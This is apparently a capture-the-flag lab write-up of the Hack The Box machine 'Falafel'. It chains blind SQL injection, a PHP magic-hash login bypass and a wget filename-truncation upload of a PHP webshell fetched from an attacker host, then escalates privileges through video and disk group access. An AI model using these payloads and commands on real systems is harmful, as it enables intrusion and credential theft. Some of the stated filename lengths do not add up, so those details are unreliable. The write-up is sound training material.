# HTB: Falafel — Writeup

**Difficulty:** Hard | **OS:** Linux | **IP:** 10.10.10.73  
**Profile:** [MaikPro @ HackTheBox](https://app.hackthebox.com/profile/MaikPro)

---

## Summary

Falafel chains a boolean-based blind SQL injection to enumerate users, PHP loose
comparison (type juggling) to bypass authentication with a magic hash, a wget
filename truncation bug to upload a PHP webshell, then abuses Linux group
membership (`video` for framebuffer capture, `disk` for raw block device access
via debugfs) to escalate from `moshe` to `yossi` to `root`.

---

## Enumeration

### TCP Scan

```bash
nmap -sC -sV -oA nmap/falafel 10.10.10.73
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

### Directory Discovery

```bash
gobuster dir -x php -u http://10.10.10.73 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Key finds: `/login.php`, `/upload.php`, `/uploads/`, `/cyberlaw.txt`

`cyberlaw.txt` hints at two users: `admin` and `chris`.

---

## Foothold

### Boolean-Based Blind SQL Injection

The login form returns distinct messages:

```
Invalid username   → "Try again"
Valid username,
wrong password     → "Wrong identification : <user>"
```

This leaks user existence. Automate enumeration and hash dump with sqlmap:

```bash
sqlmap -u http://10.10.10.73/login.php --forms \
  --level 5 --risk 3 \
  --string "Wrong identification" --dump --batch
```

Results from `falafel.users`:

| User | Hash |
|------|------|
| admin | `0e462096931906507119562988736854` |
| chris | `d4ee02a22fc872e36d9e3751ba72ddc8` |

### PHP Type Juggling — Magic Hash

The backend compares hashes using loose equality (`==`):

```php
if ($hash == md5($password)) { ... }  // vulnerable — should be ===
```

PHP interprets strings starting with `0e` followed only by digits as scientific
notation (i.e., zero). Any password whose MD5 also starts with `0e[digits]`
will evaluate as equal.

Admin hash: `0e462096931906507119562988736854`

**Magic payload:** `240610708`

```
md5("240610708") = 0e462097431906509019562988736854
PHP evaluates:    0e... == 0e...  →  0 == 0  →  TRUE
```

Login as `admin`.

### File Upload Bypass — wget Filename Truncation

The upload feature fetches files via `wget`. `wget` truncates filenames at 236
characters. The server validates only the last file extension.

Craft a URL whose filename is 237 characters ending in `.php.png`:

```
http://ATTACKER_IP/[232 × A].php.png
```

Server validates `.png` (allowed). `wget` saves as `[232 × A].php` (truncated).

PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

Verify execution:

```
http://10.10.10.73/uploads/AAA...AAA.php?cmd=id
# uid=33(www-data)
```

---

## Privilege Escalation — www-data → moshe

Database credentials exposed in `/var/www/html/connection.php`:

```php
$db_user = "moshe";
$db_pass = "falafelIsReallyTasty";
```

```bash
ssh moshe@10.10.10.73
cat /home/moshe/user.txt
```

**User flag captured.**

---

## Privilege Escalation — moshe → yossi (video group)

```bash
id
# groups=1000(moshe),4(adm),8(mail),22(voice),25(floppy),29(audio),44(video),60(games)
```

`moshe` is in the `video` group — direct read access to `/dev/fb0` (framebuffer).

```bash
# Capture the framebuffer
cp /dev/fb0 /tmp/screen.raw

# Get screen resolution
cat /sys/class/graphics/fb0/virtual_size
# 1176x885
```

Transfer to attacker machine and convert:

```bash
ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screen.raw screen.jpg
```

The screenshot shows `yossi`'s active terminal session with the password visible:

```
MoshePlzStopHackingMe!
```

```bash
ssh yossi@10.10.10.73
```

---

## Privilege Escalation — yossi → root (disk group)

```bash
id
# groups=1001(yossi),6(disk),4(adm)
```

`disk` group allows direct read access to the block device `/dev/sda1`.

```bash
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

Copy the private key to the attacker machine:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.10.10.73
cat /root/root.txt
```

**Root flag captured.**

---

## Attack Chain

```
HTTP recon → cyberlaw.txt → users: admin, chris
  → boolean blind SQLi (sqlmap) → dump hashes
  → PHP type juggling → md5("240610708") = 0e... → admin login
  → file upload via wget → filename truncation 237 chars → .php webshell
  → connection.php → moshe:falafelIsReallyTasty → SSH
  → video group → /dev/fb0 → framebuffer screenshot → yossi password
  → disk group → debugfs /dev/sda1 → root SSH private key
  → root.txt
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Service enumeration |
| gobuster | Directory and file discovery |
| sqlmap | Automated boolean-based SQL injection |
| wget | Filename truncation (built-in behaviour) |
| ffmpeg | Framebuffer raw image conversion |
| debugfs | Raw block device filesystem access |
| ssh | Lateral movement and root access |

---

## CVEs & Techniques

| Reference | Description |
|-----------|-------------|
| CWE-697 | PHP loose comparison — type juggling (`==` vs `===`) |
| CWE-89 | Boolean-based blind SQL injection |
| CWE-434 | Unrestricted file upload via wget filename truncation |
| — | Linux `video` group abuse — framebuffer credential capture |
| — | Linux `disk` group abuse — raw block device read via debugfs |
